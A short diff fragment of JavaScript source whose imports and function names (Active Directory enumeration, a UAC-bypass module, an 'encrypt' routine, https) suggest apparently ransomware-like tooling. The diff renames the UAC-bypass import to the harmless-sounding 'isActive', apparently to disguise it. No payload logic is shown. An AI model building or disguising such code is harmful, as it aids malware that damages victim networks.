@@ -6,7 +6,7 @@ import config from './config.json';
 import https from 'https';
 import createRandomString from './utils/generateRandomString';
 import enumerateAD from './enumerateAd';
-import isActive from './UACBypass';
+import isActive from './isActive';
 
 const encrypt = () => {
   enumerateAD();
